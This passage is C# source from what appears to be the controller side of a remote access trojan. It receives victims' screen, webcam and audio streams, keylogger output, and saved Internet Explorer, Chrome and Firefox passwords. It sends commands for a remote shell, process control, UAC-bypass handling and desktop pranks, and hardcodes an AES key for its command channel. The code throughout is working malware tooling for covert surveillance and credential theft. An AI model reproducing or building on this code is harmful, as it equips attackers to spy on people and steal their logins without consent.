        private int getSocket(Socket socket)
        {
            int tracer = 0;

            foreach (Socket s in _clientSockets)
            {
                if (s == socket)
                {
                    break;
                }
                tracer++;
            }

            return tracer;
        }

        private delegate void setImageCallback(Bitmap image);

        private void setImage(Bitmap image)
        {
            if (this.InvokeRequired)
            {
                setImageCallback callback = new setImageCallback(setImage);
                if (image != null) this.Invoke(callback, new object[] { image });
            }
            else
            {
                if (!IsRdFull)
                {
                    if (image == null) Console.WriteLine("image is null");
                    pictureBox1.Image = image;
                }
                else
                {
                    Rdxref.image = image;
                }

                if (rdRouteUpdate != "route0.none")
                {
                    String route = rdRouteUpdate.Split('.')[0];
                    int routeIndex = int.Parse(route.Replace("route", "")) - 1;
                    Form tRoute = routeWindow[routeIndex];
                    Control.ControlCollection elements = tRoute.Controls;
                    foreach (Control c in elements)
                    {
                        if (c.Tag == null) continue;
                        if (c.Tag.ToString() == rdRouteUpdate)
                        {
                            PictureBox rdUpdate = c as PictureBox;
                            rdUpdate.Image = image;
                        }
                    }
                }
            }
        }

        private delegate void setWebCamCallback(Bitmap image);

        private void setWebCam(Bitmap image)
        {
            if (this.InvokeRequired)
            {
                setWebCamCallback callback = new setWebCamCallback(setWebCam);
                this.Invoke(callback, new object[] { image });
            }
            else
            {
                pictureBox2.Image = image;
                if (wcRouteUpdate != "route0.none")
                {
                    String route = rdRouteUpdate.Split('.')[0];
                    int routeIndex = int.Parse(route.Replace("route", "")) - 1;
                    Form tRoute = routeWindow[routeIndex];
                    Control.ControlCollection elements = tRoute.Controls;
                    foreach (Control c in elements)
                    {
                        if (c.Tag == null) continue;
                        if (c.Tag.ToString() == wcRouteUpdate)
                        {
                            PictureBox wcUpdate = c as PictureBox;
                            wcUpdate.Image = image;
                        }
                    }
                }
            }
        }

//Receive Callback (when client sends back data to server)


        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState;
            int received;
            bool dclient = false;

            if (!IsStartedServer) return;

            try
            {
                received = current.EndReceive(AR);
            }
            catch (Exception)
            {
                int id = getSocket(current);
                reScanTarget = true;
                reScanStart = id;
                Console.WriteLine("Client forcefully disconnected");
                current.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                _clientSockets.Remove(current);
                restartServer(id);
                return;
            }


            byte[] recBuf = new byte[received];
            Array.Copy(_buffer, recBuf, received);
            bool ignoreFlag = false;

            if (MultiRecv)
            {
                String header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2);
                //Console.WriteLine("Header: " + header + "\nSize: " + recBuf.Length.ToString());
                if (header == "rdstream")
                {
                    using (System.IO.MemoryStream stream = new System.IO.MemoryStream())
                    {
                        stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2);
                        //Console.WriteLine("multiRecv Length: " + recBuf.Length);
                        System.Drawing.Bitmap deskimage = (System.Drawing.Bitmap) System.Drawing.Bitmap.FromStream(stream);
                        if (resdataav == 0)
                        {
                            resx = deskimage.Width;
                            resy = deskimage.Height;
                            resdataav = 1;
                        }
                        setImage(deskimage);
                        /*deskimage.Dispose();
                        deskimage = null;*/
                        //Console.Title = "Received image!!";
                        Array.Clear(recBuf, 0, received);
                        ignoreFlag = true;
                    }
                }

                if (header == "austream")
                {
                    byte[] data = new Byte[recBuf.Length];
                    Buffer.BlockCopy(recBuf, 8 * 2, data, 0, recBuf.Length - 8 * 2);
                    recBuf = null;
                    astream.bufferPlay(data);
                    ignoreFlag = true;
                }

                if (header == "wcstream")
                {
                    System.IO.MemoryStream stream = new System.IO.MemoryStream();

                    stream.Write(recBuf, 8 * 2, recBuf.Length - 8 * 2);
                    Console.WriteLine("multiRecv Length: " + recBuf.Length);

                    System.Drawing.Bitmap camimage = (System.Drawing.Bitmap)System.Drawing.Bitmap.FromStream(stream);

                    stream.Flush();
                    stream.Close();
                    stream.Dispose();
                    stream = null;
                    setWebCam(camimage);
                    Array.Clear(recBuf, 0, received);
                    ignoreFlag = true;
                }
            }

            if (isFileDownload && !ignoreFlag)
            {
                Buffer.BlockCopy(recBuf, 0, recvFile, write_size, recBuf.Length);
                write_size += recBuf.Length;

                if (write_size == fdl_size)
                {
                    String rLocation = fdl_location;
                    using (FileStream fs = File.Create(rLocation))
                    {
                        Byte[] info = recvFile;
                        // Add some information to the file.
                        fs.Write(info, 0, info.Length);
                    }
                }

                Array.Clear(recvFile, 0, recvFile.Length);
                msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                isFileDownload = false;
            }

            if (!isFileDownload && !ignoreFlag)
            {
                System.Threading.Thread clThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(CheckLinux));
                ClientObject obj = new ClientObject();
                obj.buffer = recBuf;
                obj.s = current;

                clThread.Start(obj);
                string text = Encoding.Unicode.GetString(recBuf);
                text = Decrypt(text);

                if (lcm != null)
                {
                    if (lcm.IsLinuxClient(current))
                    {
                        lcm.RunCustomCommands(recBuf);
                        text = Encoding.ASCII.GetString(recBuf);
                    }
                }

                if (text.StartsWith("infoback;"))
                {
                    int id = int.Parse(text.Split(';')[1]);
                    String data = text.Split(';')[2];
                    String[] lines = data.Split('|');
                    //MessageBox.Show(data);
                    String name = lines[0];
                    String ip = lines[1];
                    String time = lines[2];
                    String av = lines[3];

                    setlvClientInfoCallback(name, ip, time, av, id);
                }

                if (text.StartsWith("setproc|"))
                {
                    foreach (String line in text.Split('\n'))
                    {
                        if (line == "") continue;

                        String name = line.Split('|')[1];
                        String responding = line.Split('|')[2];
                        String title = line.Split('|')[3];
                        String priority = line.Split('|')[4];
                        String path = line.Split('|')[5];
                        String id = line.Split('|')[6];

                        setprocInfoCallback(name, responding, title, priority, path, id);
                    }

                    SortList(listView2);
                }

                if (text.StartsWith("cmdout§"))
                {
                    //MessageBox.Show("test");
                    String output = text.Split('§')[1];
                    output = output.Replace("cmdout", String.Empty);
                    append(output);
                }

                if (text.StartsWith("fdrivel§"))
                {
                    String data = text.Split('§')[1];

                    lvClear(listView3);

                    foreach (String drive in data.Split('\n'))
                    {
                        if (!drive.Contains("|")) continue;
                        String name = drive.Split('|')[0];
                        String size = convert(drive.Split('|')[1]);

                        addFileCallback(name, size, "N/A", name);
                    }
                }

                if (text.StartsWith("fdirl"))
                {
                    String data = text.Substring(5);
                    String[] entries = data.Split('\n');

                    foreach (String entry in entries)
                    {
                        if (entry == "") continue;
                        String name = entry.Split('§')[0];
                        String size = convert(entry.Split('§')[1]);
                        String crtime = entry.Split('§')[2];
                        String path = entry.Split('§')[3];
                        //Console.WriteLine(entry.Split('§')[1]);
                        addFileCallback(name, size, crtime, path);
                    }
                }

                if (text.StartsWith("backfile§"))
                {
                    String content = text.Split('§')[1];
                    startEditor(content, me);
                }

                if (text == "fconfirm")
                {
                    Byte[] databyte = File.ReadAllBytes(fup_local_path);
                    loopSendByte(databyte);
                }

                if (text == "frecv")
                {
                    msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    uploadFinished = true;
                }

                if (text.StartsWith("finfo§"))
                {
                    int size = int.Parse(text.Split('§')[1]);
                    fdl_size = size;
                    recvFile = new byte[fdl_size];
                    isFileDownload = true;
                    loopSend("fconfirm");
                }

                if (text.StartsWith("f1§"))
                {
                    String dir = text.Split('§')[1];

                    if (dir != "drive") parent(dir);
                    if (dir == "drive")
                    {
                        Current_Path = "drive";
                        loopSend("fdrive");
                        lvClear(listView3);
                    }
                }

                if (text.StartsWith("putklog"))
                {
                    String dump = text.Substring(7);
                    setLog(dump);
                }

                if (text.StartsWith("dclient"))
                {
                    Console.WriteLine("Client Disconnected");
                    dclient = true;
                    switchTab(tabPage1);
                    killtarget = getSocket(current);
                    killSocket = current;
                    if (controlClients[0] == killtarget)
                    {
                        //TODO: write UI reset code
                        remotePipe[] rpArray = { null };
                        sCore.RAT.ExternalApps.ipcConnections.Clear();
                        Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count);
                        foreach (remotePipe rp in rpArray)
                        {
                            if (rp == null) continue;
                            rp.RemoteRemove = false;
                            ClosePipe(rp);
                        }
                        
                        rPipeList.Clear();
                    }
                    int id = killtarget;
                    reScanTarget = true;
                    reScanStart = id;
                    if (lcm != null)
                    {
                        if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id);
                    }
                    Console.WriteLine("Timer Removed Client");
                    killSocket.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                    _clientSockets.Remove(killSocket);
                    restartServer(id);
                }

                if (text.StartsWith("alist"))
                {
                    lvClear(listView4);
                    String data = text.Substring(5);
                    int devices = 0;
                    foreach (String device in data.Split('§'))
                    {
                        String name = device.Split('|')[0];
                        String channel = device.Split('|')[1];
                        addAudio(name, channel);
                        devices++;
                    }
                    if (devices == 0)
                    {
                        msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }

                if (text.StartsWith("wlist"))
                {
                    lvClear(listView5);
                    String data = text.Substring(5);
                    int devices = 0;
                    foreach (String device in data.Split('§'))
                    {
                        if (device == "") continue;
                        String id = device.Split('|')[0];
                        String name = device.Split('|')[1];
                        addCam(id, name);
                        devices++;
                    }

                    if (devices == 0)
                    {
                        msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }

                if (text.StartsWith("setstart§"))
                {
                    String sap = text.Split('§')[1];
                    remStart = sap;
                }

                if (text == "getpwu")
                {
                    System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(pwuNotification));
                    notify.Start();
                }

                if (text.StartsWith("iepw"))
                {
                    String[] ieLogins = text.Split('\n');
                    if (ieLogins[1] == "failed")
                    {
                        Console.WriteLine("no ie logins");
                    }
                    else
                    {
                        List<String> ielogin = ieLogins.ToList<String>();
                        ielogin.RemoveAt(0);
                        ieLogins = ielogin.ToArray();

                        foreach (String login in ieLogins)
                        {
                            String[] src = login.Split('§');
                            String user = src[0];
                            String password = src[1];
                            String url = src[2];
                            ListViewItem lvi = new ListViewItem();
                            lvi.Text = url;
                            lvi.SubItems.Add(user);
                            lvi.SubItems.Add(password);
                            lvAddItem(listView6, lvi, 1); // 1 = group Internet Explorer
                        }
                    }
                }

                if (text.StartsWith("gcpw"))
                {
                    String[] gcLogins = text.Split('\n');
                    if (gcLogins[1] == "failed")
                    {
                        Console.WriteLine("no gc logins");
                    }
                    else
                    {
                        List<String> gclogin = gcLogins.ToList<String>();
                        gclogin.RemoveAt(0);
                        gcLogins = gclogin.ToArray();

                        foreach (String login in gcLogins)
                        {
                            String[] src = login.Split('§');
                            String user = src[1];
                            String password = src[2];
                            String url = src[0];
                            ListViewItem lvi = new ListViewItem();
                            lvi.Text = url;
                            lvi.SubItems.Add(user);
                            lvi.SubItems.Add(password);
                            lvAddItem(listView6, lvi, 0); // 0 = group Google Chrome
                        }
                    }
                }

                if (text.StartsWith("ffpw"))
                {
                    String[] ffLogins = text.Split('\n');
                    if (ffLogins[1] == "failed")
                    {
                        Console.WriteLine("no ff logins");
                    }
                    else
                    {
                        List<String> fflogin = ffLogins.ToList<String>();
                        fflogin.RemoveAt(0);
                        ffLogins = fflogin.ToArray();

                        foreach (String login in ffLogins)
                        {
                            String[] src = login.Split('§');
                            String user = src[2];
                            String password = src[3];
                            String url = src[1];
                            ListViewItem lvi = new ListViewItem();
                            lvi.Text = url;
                            lvi.SubItems.Add(user);
                            lvi.SubItems.Add(password);
                            lvAddItem(listView6, lvi, 2); // 2 = group Firefox
                        }
                    }
                }

                if (text.StartsWith("error"))
                {
                    String code = text.Split('§')[1];
                    String title = text.Split('§')[2];
                    String message = text.Split('§')[3];
                    label24.ForeColor = Color.Gold;
                    label24.BackColor = Color.Black;
                    SetErrorText("Error " + code + "\n" + title + "\n" + message);
                    ShowError();
                    Timer t = new Timer();
                    t.Interval = 10000;
                    t.Tick += new EventHandler(dismissUpdate);
                    t.Start();
                    if (title == "UAC Bypass")
                    {
                        msgbox("UAC Bypass Failed", "Please upload the core files to the directory the client is located in\r\n(" + remStart + ")", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }

                    Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title);
                    
                    sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg);
                }

                if (text.StartsWith("ipc§"))
                {
                    string serverName = text.Split('§')[1];
                    string message = text.Substring(text.IndexOf('§') + 1);
                    message = message.Substring(message.IndexOf('§') + 1);

                    foreach (remotePipe rp in rPipeList)
                    {
                        if (rp.pname == serverName)
                        {
                            rp.WriteOutput(message);
                            break;
                        }
                    }
                }
            }

		    if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);

	    }

        private delegate void ClosePipeCallback(remotePipe rp);

        private void ClosePipe(remotePipe rp)
        {
            if (InvokeRequired)
            {
                ClosePipeCallback c = new ClosePipeCallback(ClosePipe);
                Invoke(c, new object[] { rp });
                return;
            }

            rp.Close();
        }

        private delegate void EnableButtonCallback(Button button, bool state);

        private void EnableButton(Button button, bool state)
        {
            if (InvokeRequired)
            {
                EnableButtonCallback ebc = new EnableButtonCallback(EnableButton);
                Invoke(ebc, new object[] { button, state });
                return;
            }

            button.Enabled = state;
        }

        struct ClientObject
        {
            public byte[] buffer;
            public Socket s;
        }

        private void CheckLinux(object data)
        {
            ClientObject obj = (ClientObject)data;
            byte[] buffer = obj.buffer;
            string command = Encoding.ASCII.GetString(buffer);
            if (command == "linuxClient")
            {
                //Handle Linux Clients
                Console.WriteLine("Linux Client detected!");
                int socketID = getSocket(obj.s);
                if (lcm != null)
                {
                    lcm.AddAssociation(socketID);

                }
                else
                {
                    Console.WriteLine("CheckLinux, lcm was null");
                }
            }
        }

        private delegate void SortListC(ListView lv);

        private void SortList(ListView lv)
        {
            if (InvokeRequired)
            {
                SortListC c = new SortListC(SortList);
                Invoke(c, new object[] { lv });
                return;
            }

            lv.Sorting = SortOrder.Ascending;
            lv.Sort();
        }

        private delegate void ShowErrorC();

        private void ShowError()
        {
            if (this.InvokeRequired)
            {
                ShowErrorC c = new ShowErrorC(ShowError);
                this.Invoke(c);
                return;
            }

            label24.Show();
        }

        private delegate void SetErrorTextC(string errorText);
        
        private void SetErrorText(string errorText)
        {
            if (this.InvokeRequired)
            {
                SetErrorTextC c = new SetErrorTextC(SetErrorText);
                this.Invoke(c, new object[] { errorText });
                return;
            }

            label24.Text = errorText;
        }

        private void pwuNotification()
        {
            System.Threading.Thread.Sleep(3000);
            //msgbox("Try Again!", "PasswordFox.exe is not downloaded please wait 5 seconds and try again\nDownload in progress!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            msgbox("Error!", "ff.exe (PasswordFox.exe) is not present on the target directory!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private delegate void lvAddItemCallback(ListView lv, ListViewItem lvi, int group = -1);

        private void lvAddItem(ListView lv, ListViewItem lvi, int group = -1)
        {
            if (this.InvokeRequired)
            {
                lvAddItemCallback callback = new lvAddItemCallback(lvAddItem);
                this.Invoke(callback, new object[] { lv, lvi, group });
            }
            else
            {
                if (group != -1)
                {
                    lvi.Group = lv.Groups[group];
                }
                lv.Items.Add(lvi);
            }
        }

        private delegate void addCamCallback(String id, String name);

        private void addCam(String id, String name)
        {
            if (this.InvokeRequired)
            {
                addCamCallback callback = new addCamCallback(addCam);
                this.Invoke(callback, new object[] { id, name });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = id;
                lvi.SubItems.Add(name);
                listView5.Items.Add(lvi);
            }
        }

        private delegate void addAudioCallback(String name, String ch);

        private void addAudio(String name, String ch)
        {
            if (this.InvokeRequired)
            {
                addAudioCallback callback = new addAudioCallback(addAudio);
                this.Invoke(callback, new object[] { name, ch });
            }
            else
            {
                ListViewItem lvi = new ListViewItem(name);
                lvi.SubItems.Add(ch);
                listView4.Items.Add(lvi);
                listView4.Items[0].Selected = true;
            }
        }

        public delegate void switchTabC(TabPage tab);

        public void switchTab(TabPage tab)
        {
            if (this.InvokeRequired)
            {
                switchTabC callback = new switchTabC(switchTab);
                this.Invoke(callback, new object[] { tab });
            }
            else
            {
                tabControl1.SelectedTab = tab;
            }
        }

        private delegate void setLogCallback(String dump);

        private void setLog(String dump)
        {
            if (this.InvokeRequired)
            {
                setLogCallback callback = new setLogCallback(setLog);
                this.Invoke(callback, new object[] { dump });
            }
            else
            {
                richTextBox3.Text = dump;
            }
        }

        private delegate void lvClearCallback(ListView lv);

        private void lvClear(ListView lv)
        {
            if (this.InvokeRequired)
            {
                lvClearCallback callback = new lvClearCallback(lvClear);
                this.Invoke(callback, new object[] { lv });
            }
            else
            {
                lv.Items.Clear();
            }
        }

        private delegate void parentCallback(String directory);

        private void parent(String directory)
        {
            if (this.InvokeRequired)
            {
                parentCallback callback = new parentCallback(parent);
                this.Invoke(callback, new object[] { directory });
            }
            else
            {
                String command = "fdir§" + directory;
                loopSend(command);
                Current_Path = directory;
                listView3.Items.Clear();
            }
        }

        private delegate void msgboxCallback(String title, String text, MessageBoxButtons button, MessageBoxIcon icon);

        private void msgbox(String title, String text, MessageBoxButtons button, MessageBoxIcon icon)
        {
            if (this.InvokeRequired)
            {
                msgboxCallback callback = new msgboxCallback(msgbox);
                this.Invoke(callback, new object[] { title, text, button, icon });
            }
            else
            {
                MessageBox.Show(this, text, title, button, icon);
            }
        }

        private delegate void startEditorCallback(String content, Form1 parent);

        private void startEditor(String content, Form1 parent)
        {
            if (this.InvokeRequired)
            {
                startEditorCallback callback = new startEditorCallback(startEditor);
                this.Invoke(callback, new object[] { content, parent });
            }
            else
            {
                Edit writer = new Edit(content, parent);
                writer.Show();
            }
        }

        private String convert(String byt)
        {
            String stackName = "B";
            //Console.WriteLine(byt);

            if (byt == "N/A")
            {
                return "Directory";
            }

            try
            {
                float bytes = float.Parse(byt);
                float div_result = 0;

                if (bytes >= 0 && bytes < 1024)
                {
                    div_result = bytes;
                }

                if (bytes >= 1024 && bytes < (1024 * 1024))
                {
                    stackName = "KB";
                    div_result = bytes / 1024;
                }

                if (bytes >= (1024 * 1024) && bytes < (1024 * 1024 * 1024))
                {
                    stackName = "MB";
                    div_result = bytes / (1024 * 1024);
                }

                if (bytes >= (1024 * 1024 * 1024))
                {
                    stackName = "GB";
                    div_result = bytes / (1024 * 1024 * 1024);
                }

                String value = div_result.ToString("0.00");
                String final = value + " " + stackName;
                return final;
            }
            catch (Exception e)
            {
                //Console.WriteLine(e);
                Console.WriteLine("files, converter error");
                return "ERROR";
            }
        }

        private delegate void addFile(String name, String size, String crtime, String path);

        private void addFileCallback(String name, String size, String crtime, String path)
        {
            if (this.InvokeRequired)
            {
                addFile callback = new addFile(addFileCallback);
                this.Invoke(callback, new object[] { name, size, crtime, path });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = name;
                lvi.SubItems.Add(size);
                lvi.SubItems.Add(crtime);
                lvi.SubItems.Add(path);
                listView3.Items.Add(lvi);
                listView3.Items[0].Selected = true;
            }
        }

        private delegate void appendText(String text);

        private void append(String text)
        {
            if (this.InvokeRequired)
            {
                appendText callback = new appendText(append);
                this.Invoke(callback, new object[] { text });
            }
            else
            {
                richTextBox2.Text += text;
            }
        }

        private delegate void setProcInfo(String name, String responding, String title, String priority, String path, String id);

        private void setprocInfoCallback(String name, String responding, String title, String priority, String path, String id)
        {
            if (this.InvokeRequired)
            {
                setProcInfo callback = new setProcInfo(setprocInfoCallback);
                this.Invoke(callback, new object[] { name, responding, title, priority, path, id });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = name;
                lvi.SubItems.Add(id);
                lvi.SubItems.Add(responding);
                lvi.SubItems.Add(title);
                lvi.SubItems.Add(priority);
                lvi.SubItems.Add(path);

                listView2.Items.Add(lvi);
            }

        }

        private delegate void setlvClientInfo(String name, String ip, String time, String av, int id);

        private void setlvClientInfoCallback(String name, String ip, String time, String av, int id)
        {
            if (this.InvokeRequired)
            {
                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback);
                this.Invoke(k, new object[] { name, ip, time, av, id });
            }
            else
            {
                ListViewItem client = listView1.Items[id];
                client.SubItems.Add(name);
                client.SubItems.Add(ip);
                client.SubItems.Add(time);
                client.SubItems.Add(av);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!IsStartedServer)
            {
                SetupServer();
                IsStartedServer = true;
                button1.Text = "Terminate Server";
                if (reScanTarget)
                {
                    //MessageBox.Show("rescan");
                    tabControl1.SelectedTab = tabPage1;
                    List<Socket> sock = _clientSockets;
                    List<Socket> conn = new List<Socket>();
                    foreach (Socket s in sock)
                    {
                        if (s.Connected) conn.Add(s);
                    }

                    _clientSockets = conn;
                    listView1.Items.Clear();

                    int id = 0;

                    foreach (Socket client in _clientSockets)
                    {
                        sendCommand("getinfo-" + id.ToString(), id);
                        id++;
                        //MessageBox.Show("getinfo-" + id.ToString());
                    }

                    reScanStart = -1;
                    reScanTarget = false;
                }
                return;
            }
            if (IsStartedServer)
            {
                CloseAllSockets();
                label1.Text = "Server is offline";
                button1.Text = "Start Server";
                listView1.Items.Clear();
            }
        }

        public string Encrypt(string clearText)
        {
            string EncryptionKey = "MAKV2SPBNI99212";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            Console.WriteLine("PlainText command: " + clearText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            Console.WriteLine("Encrypted Command: " + clearText);
            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
            }
            return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                Console.WriteLine("Decrypt error " + cipherText);
                return cipherText;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                List<int> clients = new List<int>();

                foreach (ListViewItem lvi in listView1.SelectedItems)
                {
                    int id = int.Parse(lvi.SubItems[0].Text.Replace("Client ", ""));
                    clients.Add(id);
                }

                controlClients = clients.ToArray();
                sCore.RAT.ServerSettings.currentClient = controlClients[0];
                sendCommand("getstart", clients[0]);
            }
        }

        private void sendCommand(String command, int targetClient)
        {

            Socket s = _clientSockets[targetClient];

            if (lcm.IsLinuxClient(s))
            {
                lcm.SendCommand(command, targetClient);
                return;
            }

            try
            {
                String k = command;

                String crypted = Encrypt(k);
                byte[] data = Encoding.Unicode.GetBytes(crypted);
                String header = crypted.Length.ToString() + "§";
                byte[] byteHeader = Encoding.Unicode.GetBytes(header);
                byte[] fullBytes = new byte[byteHeader.Length + data.Length];
                Array.Copy(byteHeader, fullBytes, byteHeader.Length);
                Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length);
                s.Send(fullBytes);
            }
            catch (Exception)
            {
                int id = targetClient;
                reScanTarget = true;
                reScanStart = id;
                Console.WriteLine("Client forcefully disconnected");
                s.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                _clientSockets.Remove(s);
                switchTab(tabControl1.TabPages[0]);
                restartServer(id);
                return;
            }
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            String title = textBox1.Text;
            String text = textBox2.Text;
            String icons = comboBox1.SelectedItem.ToString();
            String buttons = comboBox2.SelectedItem.ToString();
            int ico = 0;
            int btn = 0;

            // Map icons and buttons to int numbers!

            switch (icons)
            {
                case "Error":
                    ico = 1;
                    break;

                case "Warning":
                    ico = 2;
                    break;

                case "Information":
                    ico = 3;
                    break;

                case "Question":
                    ico = 4;
                    break;

                case "None":
                    ico = 0;
                    break;
            }

            switch (buttons)
            {
                case "Yes No":
                    btn = 1;
                    break;

                case "Yes No Cancel":
                    btn = 2;
                    break;

                case "Abort Retry Ignore":
                    btn = 3;
                    break;

                case "Ok Cancel":
                    btn = 4;
                    break;

                case "Ok":
                    btn = 0;
                    break;
            }

            //Construct data

            String cmd = "msg|" + title + "|" + text + "|" + ico + "|" + btn;
            loopSend(cmd);
        }

        public void loopSend(String command)
        {
            foreach (int client in controlClients)
            {
                sendCommand(command, client);
            }
        }

        private void loopSendByte(byte[] data)
        {
            foreach (int client in controlClients)
            {
                sendCommand(data, client);
            }
        }

        private void sendCommand(byte[] data, int targetClient)
        {
            Socket s = _clientSockets[targetClient];
            s.Send(data);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            String cmd = "freq-" + textBox3.Text;
            loopSend(cmd);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            String opt = comboBox3.SelectedItem.ToString();
            String code = "0";

            switch (opt)
            {
                case "Beep":
                    code = "0";
                    break;

                case "Error":
                    code = "1";
                    break;

                case "Warning":
                    code = "2";
                    break;

                case "Information":
                    code = "3";
                    break;
            }

            String cmd = "sound-" + code;
            loopSend(cmd);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            String text = richTextBox1.Text;
            String cmd = "t2s|" + text; // again dont use "|" in the text

            loopSend(cmd);
        }

        private void button12_Click(object sender, EventArgs e)
        {
            String cmd = "cd|open";

            loopSend(cmd);
        }

        private void button13_Click(object sender, EventArgs e)
        {
            String cmd = "cd|close";

            loopSend(cmd);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            String cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|clock";
                c.Text = "Clock: Hidden";
            }
            else
            {
                cmd = "emt|show|clock";
                c.Text = "Clock: Visible";
            }

            loopSend(cmd);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            String cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|task";
                c.Text = "Task Bar: Hidden";
            }
            else
            {
                cmd = "emt|show|task";
                c.Text = "Task Bar: Visible";
            }

            loopSend(cmd);
        }

        private void button9_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            String cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|desktop";
                c.Text = "Desktop Icons: Hidden";
            }
            else
            {
                cmd = "emt|show|desktop";
                c.Text = "Desktop Icons: Visible";
            }

            loopSend(cmd);
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            String cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|tray";
                c.Text = "Tray Icons: Hidden";
            }
            else
            {
                cmd = "emt|show|tray";
                c.Text = "Tray Icons: Visible";
            }

            loopSend(cmd);
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender;
            String cmd = "";

            if (c.Text.Contains("Visible"))
            {
                cmd = "emt|hide|start";
                c.Text = "Start Menu: Hidden";
            }
            else
            {
                cmd = "emt|show|start";
                c.Text = "Start Menu: Visible";
            }

            loopSend(cmd);
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            String cmd = "proclist";
            listView2.Items.Clear();
            loopSend(cmd);
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 0)
            {
                String id = listView2.SelectedItems[0].SubItems[1].Text; // process id
                String cmd = "prockill|" + id;

                loopSend(cmd);

                System.Threading.Thread.Sleep(1000);
                listView2.Items.Clear();
                loopSend("proclist");
            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            String cmd = "procstart|" + textBox4.Text + "|" + comboBox4.SelectedItem.ToString();

            loopSend(cmd);
            textBox4.Clear();
            System.Threading.Thread.Sleep(1000);
            listView2.Items.Clear();
            loopSend("proclist");
        }

        private void button15_Click(object sender, EventArgs e)
        {
            if (!IsCmdStarted)
            {
                String command = "startcmd";
                loopSend(command);
                IsCmdStarted = true;
                button15.Text = "Stop Cmd";
            }
            else
            {
                String command = "stopcmd";
                loopSend(command);
                IsCmdStarted = false;
                button15.Text = "Start Cmd";
            }
        }

        private void textBox5_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return && IsCmdStarted)
            {
                String command = "cmd§" + textBox5.Text;
                textBox5.Text = "";
                if (command == "cmd§cls" || command == "cmd§clear")
                {
                    richTextBox2.Clear();
                    return;
                }

                if (command == "cmd§exit")
                {
                    DialogResult result = MessageBox.Show(this, "Do you want to exit the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                    if (result == DialogResult.Yes)
                    {
                        loopSend("stopcmd");
                        button15.Text = "Start Cmd";
                        IsCmdStarted = false;
                        return;
                    }
